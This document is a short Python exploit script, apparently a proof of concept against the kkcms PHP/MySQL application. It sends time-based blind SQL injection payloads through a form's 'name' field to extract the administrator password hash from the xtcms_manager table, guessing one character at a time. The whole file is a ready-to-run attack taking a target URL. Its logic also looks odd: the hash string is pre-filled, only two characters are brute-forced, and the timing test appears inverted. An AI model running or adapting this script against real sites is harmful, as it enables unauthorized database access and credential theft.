#!/usr/bin/python3

import requests
import sys
import time

def do_request(url, guess_char, payload_var):
    payload = "abc'and if((ascii(substring((select m_password from xtcms_manager limit 1)," + str(guess_char) + ",1))=" + str(payload_var) + "),sleep(5),1)#";
    r = requests.post(url, data={"name":payload, "email":"", "submit":""}, timeout=35);
    return r.elapsed.total_seconds();

def main():
    if len(sys.argv) != 2:
        print("Usage: below example is from ubuntu");
        print("Usage: python3 time-blind-php-mysql-kkcms-exp.py http://www.example.com");
        exit();
    else:
        url = sys.argv[1];

    #定义爆破字符集,md5加密后的字符串只包括小写字母和数字，故只定义小写字母和数字
    char_set = [];
    for i in range(97, 123):
        char_set.append(i);
    for j in range(48, 58):
        char_set.append(j);
    #print(char_set);

    start_time = time.asctime( time.localtime( time.time() ) );
    print("Starting time is: " + start_time);

    success_string = "e10adc3949ba59abbe56e057f20f88";
    count = 31;
    for m in range(31, 33):
        for k in char_set:
            print("  Guessing the char " + chr(k) + " ...");
            elapsed = do_request(url, m, k);
            if elapsed > 20.0:
                continue;
            else:
                print( "                                     Bruted the char" + str(count) + ": " + chr(k) );
                success_string += ( chr(k) );
                break;
        count += 1;
    print("The final string is: " + success_string);
    
    end_time = time.asctime( time.localtime( time.time() ) );
    print("Ending time is: " + end_time);

main();
